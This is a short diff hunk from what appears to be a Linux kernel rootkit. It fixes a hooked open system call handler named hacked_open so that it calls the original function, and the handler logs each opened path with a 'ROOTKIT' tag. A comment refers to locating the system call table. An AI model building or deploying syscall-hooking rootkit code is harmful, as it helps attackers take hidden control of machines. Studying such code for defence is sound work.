@@ -55,7 +55,7 @@ static asmlinkage long hacked_open(const struct pt_regs *pt_regs) {
     int flags = (int)pt_regs->di;
 
     printk("ROOTKIT: Opening %s...\n", pathname);
-    return orig_open;
+    return orig_open(pt_regs);
 }
 
 // Returns a pointer to the system call table
